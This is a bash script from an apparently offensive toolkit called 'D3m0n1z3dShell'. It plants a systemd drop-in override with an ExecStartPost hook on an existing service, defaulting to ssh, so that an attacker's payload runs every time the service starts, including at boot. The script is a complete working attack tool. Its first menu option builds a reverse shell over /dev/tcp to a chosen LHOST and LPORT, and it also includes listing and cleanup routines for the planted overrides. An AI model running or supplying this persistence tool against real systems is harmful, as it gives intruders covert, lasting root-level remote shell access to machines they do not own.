#!/bin/bash
# D3m0n1z3dShell — SystemD Drop-in Override Persistence (T1543.002)
# Based on Metasploit init_systemd_override.rb — ExecStartPost hook on existing service

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_override"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   SystemD Drop-in Override Persistence            ║"
    echo " ║   T1543.002 — Piggyback on existing service       ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root(){
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
}

list_services(){
    echo -e "${CYAN}[*] Running services:${NC}"
    systemctl list-units --type=service --state=running --no-pager 2>/dev/null | grep '.service' | awk '{print "  "$1}' | head -20
}

install_override(){
    local SERVICE="$1" PAYLOAD="$2"
    local SVC_DIR="/etc/systemd/system/${SERVICE}.service.d"
    local OVERRIDE="${SVC_DIR}/override.conf"

    # Verify service exists
    if ! systemctl cat "${SERVICE}.service" >/dev/null 2>&1; then
        echo -e "${RED}[-] Service '${SERVICE}' not found${NC}"
        return 1
    fi

    # Backup if exists
    if [[ -f "$OVERRIDE" ]]; then
        cp "$OVERRIDE" "${OVERRIDE}.d3m0n.bak"
        echo -e "${YELLOW}[*] Backed up existing override${NC}"
    fi

    mkdir -p "$SVC_DIR"

    cat > "$OVERRIDE" << EOF
# ${MARKER}
[Service]
ExecStartPost=/bin/sh -c '${PAYLOAD} &'
EOF

    systemctl daemon-reload 2>/dev/null
    echo -e "${GREEN}[+] Override installed for ${SERVICE}${NC}"
    echo -e "${YELLOW}[*] Payload runs after ${SERVICE} starts (including at boot)${NC}"

    read -p "Restart service now to trigger? [y/N]: " RST
    if [[ "$RST" =~ ^[Yy]$ ]]; then
        systemctl restart "${SERVICE}.service" 2>/dev/null
        echo -e "${GREEN}[+] Service restarted${NC}"
    fi
}

menu(){
    banner
    check_root

    echo -e "  ${CYAN}[1]${NC} Install override (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Install override (custom command)"
    echo -e "  ${CYAN}[3]${NC} List running services"
    echo -e "  ${CYAN}[4]${NC} List installed overrides"
    echo -e "  ${CYAN}[5]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-5]: " OPT

    case "$OPT" in
        1)
            list_services
            echo ""
            read -p "  Service to override [ssh]: " SVC
            SVC="${SVC:-ssh}"
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            PAYLOAD="nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
            install_override "$SVC" "$PAYLOAD"
            ;;
        2)
            list_services
            echo ""
            read -p "  Service to override [ssh]: " SVC
            SVC="${SVC:-ssh}"
            read -p "  Command to execute: " CMD
            install_override "$SVC" "$CMD"
            ;;
        3)
            list_services
            ;;
        4)
            echo -e "${CYAN}[*] Installed d3m0n overrides:${NC}"
            find /etc/systemd/system -name 'override.conf' -exec grep -l "$MARKER" {} \; 2>/dev/null | while read -r f; do
                echo -e "  ${GREEN}→${NC} $f"
                sed -n '/ExecStartPost/p' "$f" | sed 's/^/    /'
            done
            ;;
        5)
            echo -e "${YELLOW}[*] Removing d3m0n overrides...${NC}"
            find /etc/systemd/system -name 'override.conf' -exec grep -l "$MARKER" {} \; 2>/dev/null | while read -r f; do
                local dir=$(dirname "$f")
                if [[ -f "${f}.d3m0n.bak" ]]; then
                    mv "${f}.d3m0n.bak" "$f"
                    echo -e "  ${GREEN}[+] Restored backup: $f${NC}"
                else
                    rm -f "$f"
                    rmdir "$dir" 2>/dev/null
                    echo -e "  ${GREEN}[+] Removed: $f${NC}"
                fi
            done
            systemctl daemon-reload 2>/dev/null
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
